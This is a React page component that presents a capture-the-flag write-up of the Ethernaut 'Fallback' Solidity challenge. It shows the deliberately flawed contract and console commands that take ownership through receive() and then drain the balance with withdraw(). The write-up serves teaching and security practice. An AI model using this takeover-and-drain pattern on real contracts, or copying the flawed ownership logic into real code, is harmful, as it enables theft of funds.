import { useState, useEffect, useRef } from "react";
import {
  ChevronDown,
  ChevronUp,
  Code,
  Terminal,
  Zap,
  Shield,
  Trophy,
  ExternalLink,
} from "lucide-react";

const FallbackBlog = () => {
  const [expandedSections, setExpandedSections] = useState({});
  const [typedText, setTypedText] = useState("");
  const [showCursor, setShowCursor] = useState(true);
  const [scrollProgress, setScrollProgress] = useState(0);
  const sectionsRef = useRef([]);

  // Terminal typing effect
  useEffect(() => {
    const text = "root@5R1B4BU:~$ ./explain_fallback.sh";
    let index = 0;
    setTypedText("");

    const typeWriter = () => {
      if (index < text.length) {
        setTypedText(text.slice(0, index + 1));
        index++;
        setTimeout(typeWriter, 100);
      }
    };

    typeWriter();
  }, []);

  // Cursor blinking effect
  useEffect(() => {
    const interval = setInterval(() => {
      setShowCursor((prev) => !prev);
    }, 500);
    return () => clearInterval(interval);
  }, []);

  // Scroll progress tracking
  useEffect(() => {
    const handleScroll = () => {
      const scrollTop = window.pageYOffset;
      const docHeight =
        document.documentElement.scrollHeight - window.innerHeight;
      const progress = (scrollTop / docHeight) * 100;
      setScrollProgress(progress);
    };

    window.addEventListener("scroll", handleScroll);
    return () => window.removeEventListener("scroll", handleScroll);
  }, []);

  const toggleSection = (section) => {
    setExpandedSections((prev) => ({
      ...prev,
      [section]: !prev[section],
    }));
  };

  const CodeBlock = ({ children, language = "solidity" }) => (
    <div className="bg-black/70 border border-green-500/30 rounded-lg overflow-hidden my-4">
      <div className="flex items-center justify-between px-2 sm:px-4 py-2 bg-green-500/10 border-b border-green-500/20">
        <div className="flex items-center space-x-2">
          <div className="w-2 h-2 sm:w-3 sm:h-3 bg-red-500 rounded-full"></div>
          <div className="w-2 h-2 sm:w-3 sm:h-3 bg-yellow-500 rounded-full"></div>
          <div className="w-2 h-2 sm:w-3 sm:h-3 bg-green-500 rounded-full"></div>
        </div>
        <span className="text-[10px] sm:text-xs text-green-400 font-mono">
          {language}
        </span>
      </div>
      <pre className="p-2 sm:p-4 overflow-x-auto text-xs sm:text-sm">
        <code className="text-green-300 font-mono whitespace-pre-wrap break-words">
          {children}
        </code>
      </pre>
    </div>
  );

  const ConsoleBlock = ({ children }) => (
    <div className="bg-black/70 border border-green-500/30 rounded-lg p-2 sm:p-4 my-4">
      <div className="flex items-center mb-2">
        <Terminal className="w-3 h-3 sm:w-4 sm:h-4 text-green-400 mr-2" />
        <span className="text-xs sm:text-sm text-green-400 font-mono">
          Browser Console
        </span>
      </div>
      <pre className="text-green-300 text-xs sm:text-sm font-mono whitespace-pre-wrap break-words">
        <code>{children}</code>
      </pre>
    </div>
  );

  const InfoBox = ({ type = "info", title, children }) => {
    const colors = {
      info: "border-blue-500/30 bg-blue-500/10",
      warning: "border-yellow-500/30 bg-yellow-500/10",
      success: "border-green-500/30 bg-green-500/10",
      example: "border-cyan-500/30 bg-cyan-500/10",
    };

    return (
      <div
        className={`border rounded-lg p-4 my-4 backdrop-blur-sm ${colors[type]}`}
      >
        <div className="flex items-center mb-2">
          <span className="text-green-300 font-bold font-mono">{title}</span>
        </div>
        <div className="text-green-100">{children}</div>
      </div>
    );
  };

  return (
    <div className="min-h-screen bg-black text-green-400 font-mono relative overflow-hidden">
      {/* Background Effects */}
      <div className="fixed inset-0 opacity-5 pointer-events-none">
        <div className="absolute inset-0 bg-gradient-to-br from-green-500/10 via-transparent to-green-500/5"></div>
        {[...Array(20)].map((_, i) => (
          <div
            key={i}
            className="absolute w-px bg-gradient-to-b from-transparent via-green-500/20 to-transparent animate-pulse"
            style={{
              left: `${Math.random() * 100}%`,
              height: `${Math.random() * 100 + 50}%`,
              animationDelay: `${Math.random() * 3}s`,
              animationDuration: `${Math.random() * 2 + 2}s`,
            }}
          ></div>
        ))}
      </div>

      {/* Progress Bar */}
      <div className="fixed top-0 left-0 w-full h-1 bg-black/50 z-50">
        <div
          className="h-full bg-gradient-to-r from-green-500 to-cyan-500 transition-all duration-300"
          style={{ width: `${scrollProgress}%` }}
        ></div>
      </div>

      {/* Main Content */}
      <div className="container mx-auto px-2 sm:px-4 py-4 sm:py-8 max-w-4xl relative z-10">
        {/* Header */}
        <header className="mb-4 sm:mb-8">
          <div className="bg-black/95 backdrop-blur-md border border-green-500/30 rounded-lg p-3 sm:p-6 shadow-2xl">
            <div className="flex items-center space-x-2 mb-3 sm:mb-4">
              <div className="w-2 h-2 sm:w-3 sm:h-3 bg-red-500 rounded-full animate-pulse"></div>
              <div
                className="w-2 h-2 sm:w-3 sm:h-3 bg-yellow-500 rounded-full animate-pulse"
                style={{ animationDelay: "0.2s" }}
              ></div>
              <div
                className="w-2 h-2 sm:w-3 sm:h-3 bg-green-500 rounded-full animate-pulse"
                style={{ animationDelay: "0.4s" }}
              ></div>
              <span className="text-[10px] sm:text-xs text-green-400/60 ml-2">
                terminal@ethernaut-classroom
              </span>
            </div>

            <div className="border-b border-green-500/20 mb-3 sm:mb-4 pb-2">
              <div className="flex items-center">
                <span className="text-green-500 font-bold text-sm sm:text-base">
                  {typedText}
                </span>
                {showCursor && (
                  <span className="text-green-400 animate-pulse ml-1">█</span>
                )}
              </div>
            </div>

            <div className="text-center">
              <h1 className="text-xl sm:text-2xl md:text-4xl font-bold text-green-300 mb-2">
                Ethernaut Fallback Challenge
              </h1>
              <p className="text-green-400/80 text-sm sm:text-base">
                A Hacker's Guide to Smart Contract Security
              </p>
            </div>
          </div>
        </header>

        {/* Challenge Overview */}
        <section
          ref={(el) => (sectionsRef.current[0] = el)}
          className="mb-6 sm:mb-12"
        >
          <div className="bg-black/70 backdrop-blur-sm border border-green-500/20 rounded-lg p-3 sm:p-6 shadow-lg">
            <h2 className="text-lg sm:text-xl md:text-2xl font-bold text-green-300 mb-3 sm:mb-4 flex items-center">
              <span className="text-green-500 mr-2">[01]</span>
              Challenge Overview
            </h2>

            <div className="space-y-3 sm:space-y-4 text-gray-300 text-sm sm:text-base">
              <p>
                The Fallback challenge is one of the foundational levels in
                Ethernaut that teaches us about fallback functions and receive
                functions in Solidity. The goal is straightforward but requires
                understanding of how these special functions work.
              </p>
              <InfoBox type="info" title="OBJECTIVES">
                <ul className="list-disc list-inside space-y-1 text-gray-300 text-sm sm:text-base">
                  <li>Claim ownership of the contract</li>
                  <li>Reduce the contract's balance to 0</li>
                </ul>
              </InfoBox>
            </div>
          </div>
        </section>

        {/* Contract Analysis */}
        <section
          ref={(el) => (sectionsRef.current[1] = el)}
          className="mb-6 sm:mb-12"
        >
          <div className="bg-black/70 backdrop-blur-sm border border-green-500/20 rounded-lg p-3 sm:p-6 shadow-lg">
            <h2 className="text-lg sm:text-xl md:text-2xl font-bold text-green-300 mb-3 sm:mb-4 flex items-center">
              <span className="text-green-500 mr-2">[02]</span>
              Contract Analysis
            </h2>

            <CodeBlock>
              {`// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

contract Fallback {
    mapping(address => uint) public contributions;
    address public owner;

    constructor() {
        owner = msg.sender;
        contributions[msg.sender] = 1000 * (1 ether);
    }

    modifier onlyOwner {
        require(msg.sender == owner, "caller is not the owner");
        _;
    }

    function contribute() public payable {
        require(msg.value < 0.001 ether);
        contributions[msg.sender] += msg.value;
        if(contributions[msg.sender] > contributions[owner]) {
            owner = msg.sender;
        }
    }

    function getContribution() public view returns (uint) {
        return contributions[msg.sender];
    }

    function withdraw() public onlyOwner {
        payable(owner).transfer(address(this).balance);
    }

    receive() external payable {
        require(msg.value > 0 && contributions[msg.sender] > 0);
        owner = msg.sender;
    }
}`}
            </CodeBlock>

            <InfoBox type="warning" title="KEY OBSERVATIONS">
              <ul className="list-disc list-inside space-y-2 text-gray-300 text-sm sm:text-base">
                <li>
                  <strong>contribute()</strong>: Allows contributions less than
                  0.001 ether, changes owner if contribution exceeds current
                  owner's
                </li>
                <li>
                  <strong>receive()</strong>: Automatically triggered when ETH
                  is sent to contract, changes owner if sender has any
                  contribution
                </li>
                <li>
                  <strong>withdraw()</strong>: Only owner can withdraw all
                  contract balance
                </li>
                <li>
                  Owner starts with 1000 ether contribution - impossible to beat
                  via contribute()
                </li>
              </ul>
            </InfoBox>
          </div>
        </section>

        {/* Solution Strategy */}
        <section
          ref={(el) => (sectionsRef.current[2] = el)}
          className="mb-6 sm:mb-12"
        >
          <div className="bg-black/70 backdrop-blur-sm border border-green-500/20 rounded-lg p-3 sm:p-6 shadow-lg">
            <h2 className="text-lg sm:text-xl md:text-2xl font-bold text-green-300 mb-3 sm:mb-4 flex items-center">
              <span className="text-green-500 mr-2">[03]</span>
              Solution Strategy
            </h2>

            <div className="space-y-4 sm:space-y-6">
              <div className="bg-purple-500/10 border border-purple-500/20 rounded-lg p-3 sm:p-6">
                <h3 className="text-purple-300 font-semibold mb-2 sm:mb-3 text-sm sm:text-base">
                  The Attack Vector
                </h3>
                <p className="text-gray-300 mb-3 sm:mb-4 text-sm sm:text-base">
                  The key insight is that the{" "}
                  <code className="bg-gray-800 px-1 sm:px-2 py-0.5 sm:py-1 rounded text-green-400 text-xs sm:text-sm">
                    receive()
                  </code>{" "}
                  function provides an easier path to ownership than the{" "}
                  <code className="bg-gray-800 px-1 sm:px-2 py-0.5 sm:py-1 rounded text-green-400 text-xs sm:text-sm">
                    contribute()
                  </code>{" "}
                  function.
                </p>
                <div className="space-y-2 sm:space-y-3">
                  <div className="flex items-start space-x-3">
                    <div className="w-6 h-6 bg-blue-500 rounded-full flex items-center justify-center text-white text-sm font-bold mt-0.5">
                      1
                    </div>
                    <div>
                      <p className="text-white font-medium">
                        Make a small contribution
                      </p>
                      <p className="text-gray-400 text-sm">
                        Call contribute() with any amount {"< 0.001 ether"}
                      </p>
                    </div>
                  </div>
                  <div className="flex items-start space-x-3">
                    <div className="w-6 h-6 bg-blue-500 rounded-full flex items-center justify-center text-white text-sm font-bold mt-0.5">
                      2
                    </div>
                    <div>
                      <p className="text-white font-medium">
                        Trigger receive function
                      </p>
                      <p className="text-gray-400 text-sm">
                        Send ETH directly to contract to trigger receive() and
                        become owner
                      </p>
                    </div>
                  </div>
                  <div className="flex items-start space-x-3">
                    <div className="w-6 h-6 bg-blue-500 rounded-full flex items-center justify-center text-white text-sm font-bold mt-0.5">
                      3
                    </div>
                    <div>
                      <p className="text-white font-medium">
                        Drain the contract
                      </p>
                      <p className="text-gray-400 text-sm">
                        Use withdraw() as the new owner to drain all funds
                      </p>
                    </div>
                  </div>
                </div>
              </div>
            </div>
          </div>
        </section>

        {/* Implementation */}
        <section
          ref={(el) => (sectionsRef.current[3] = el)}
          className="mb-6 sm:mb-12"
        >
          <div className="bg-black/70 backdrop-blur-sm border border-green-500/20 rounded-lg p-3 sm:p-6 shadow-lg">
            <h2 className="text-lg sm:text-xl md:text-2xl font-bold text-green-300 mb-3 sm:mb-4 flex items-center">
              <span className="text-green-500 mr-2">[04]</span>
              Implementation
            </h2>

            <div className="space-y-4 sm:space-y-6">
              <div>
                <h3 className="text-white font-semibold mb-3">
                  Step 1: Make Initial Contribution
                </h3>
                <ConsoleBlock>
                  {`> await contract.contribute({value: toWei("0.0001")})

> await contract.getContribution()
100000000000000 // 0.0001 ether in wei`}
                </ConsoleBlock>
              </div>

              <div>
                <h3 className="text-white font-semibold mb-3">
                  Step 2: Trigger Receive Function
                </h3>
                <ConsoleBlock>
                  {`> await sendTransaction({
    to: contract.address,
    value: toWei("0.0001")
})

> await contract.owner()
"0x[your-address]" // You are now the owner!`}
                </ConsoleBlock>
              </div>

              <div>
                <h3 className="text-white font-semibold mb-3">
                  Step 3: Drain the Contract
                </h3>
                <ConsoleBlock>
                  {`> await getBalance(contract.address)
"0.0001" // Contract has our contributed ETH

> await contract.withdraw()

> await getBalance(contract.address) 
"0" // Contract is now empty!`}
                </ConsoleBlock>
              </div>
            </div>
          </div>
        </section>

        {/* Key Learnings */}
        <section
          ref={(el) => (sectionsRef.current[4] = el)}
          className="mb-6 sm:mb-12"
        >
          <div className="bg-black/70 backdrop-blur-sm border border-green-500/20 rounded-lg p-3 sm:p-6 shadow-lg">
            <h2 className="text-lg sm:text-xl md:text-2xl font-bold text-green-300 mb-3 sm:mb-4 flex items-center">
              <span className="text-green-500 mr-2">[05]</span>
              Key Learnings
            </h2>

            <div className="grid grid-cols-1 md:grid-cols-2 gap-3 sm:gap-6">
              <div className="bg-green-500/10 border border-green-500/20 rounded-lg p-4">
                <h3 className="text-green-300 font-semibold mb-2">
                  Fallback Functions
                </h3>
                <p className="text-gray-300 text-sm">
                  The{" "}
                  <code className="bg-gray-800 px-1 rounded">receive()</code>{" "}
                  function is automatically called when ETH is sent to a
                  contract without data. It's a powerful mechanism that can
                  change contract state.
                </p>
              </div>
              <div className="bg-blue-500/10 border border-blue-500/20 rounded-lg p-4">
                <h3 className="text-blue-300 font-semibold mb-2">
                  Access Control
                </h3>
                <p className="text-gray-300 text-sm">
                  Multiple paths to ownership can create vulnerabilities. Always
                  consider all ways critical state variables can be modified.
                </p>
              </div>
            </div>
          </div>
        </section>

        {/* Conclusion */}
        <section
          ref={(el) => (sectionsRef.current[5] = el)}
          className="mb-6 sm:mb-12"
        >
          <div className="bg-black/70 backdrop-blur-sm border border-green-500/20 rounded-lg p-3 sm:p-6 shadow-lg">
            <h2 className="text-lg sm:text-xl md:text-2xl font-bold text-green-300 mb-3 sm:mb-4 flex items-center">
              <span className="text-green-500 mr-2">[06]</span>
              Conclusion
            </h2>

            <InfoBox type="success" title="KEY TAKEAWAYS">
              <p className="mb-3 text-sm sm:text-base">
                The Fallback challenge demonstrates how seemingly innocent
                fallback functions can become attack vectors when not properly
                secured. By understanding how{" "}
                <code className="bg-gray-800 px-2 py-1 rounded text-green-400">
                  receive()
                </code>
                functions work and using the browser console tools effectively,
                we successfully claimed ownership and drained the contract.
              </p>
            </InfoBox>

            <div className="border-t border-green-500/20 mt-4 sm:mt-6 pt-3 sm:pt-4">
              <div className="flex flex-col sm:flex-row sm:items-center sm:justify-between gap-2 sm:gap-0">
                <div className="flex items-center">
                  <div className="w-2 h-2 bg-green-500 rounded-full animate-pulse"></div>
                  <span className="text-green-400 ml-2 text-xs sm:text-sm">
                    SESSION TERMINATED
                  </span>
                </div>
                <a
                  href="https://ethernaut.openzeppelin.com/"
                  target="_blank"
                  rel="noopener noreferrer"
                  className="px-3 sm:px-4 py-1.5 sm:py-2 bg-green-500/20 hover:bg-green-500/30 rounded text-xs sm:text-sm transition-colors border border-green-500/30 text-center"
                >
                  Try Ethernaut
                </a>
              </div>
              <div className="text-[10px] sm:text-xs text-green-400/60 mt-1">
                root@5R1B4BU:~$ <span className="animate-pulse">█</span>
              </div>
            </div>
          </div>
        </section>
      </div>

      {/* Custom Styles */}
      <style jsx>{`
        @keyframes pulse {
          0%,
          100% {
            opacity: 1;
          }
          50% {
            opacity: 0.5;
          }
        }

        @keyframes scan {
          0% {
            transform: translateY(-100%);
          }
          100% {
            transform: translateY(100vh);
          }
        }

        .animate-pulse {
          animation: pulse 2s cubic-bezier(0.4, 0, 0.6, 1) infinite;
        }

        .animate-scan {
          animation: scan 4s linear infinite;
        }

        /* Scrollbar Styling */
        ::-webkit-scrollbar {
          width: 4px;
        }
        ::-webkit-scrollbar-track {
          background: rgba(0, 0, 0, 0.1);
        }
        ::-webkit-scrollbar-thumb {
          background: rgba(34, 197, 94, 0.3);
          border-radius: 2px;
        }
        ::-webkit-scrollbar-thumb:hover {
          background: rgba(34, 197, 94, 0.5);
        }

        /* Mobile responsiveness */
        @media (max-width: 640px) {
          .container {
            padding-left: 0.5rem;
            padding-right: 0.5rem;
          }

          pre {
            font-size: 0.75rem;
            white-space: pre-wrap;
            word-wrap: break-word;
          }

          .grid {
            grid-template-columns: 1fr;
          }

          code {
            white-space: pre-wrap;
            word-wrap: break-word;
          }
        }
      `}</style>
    </div>
  );
};

export default FallbackBlog;
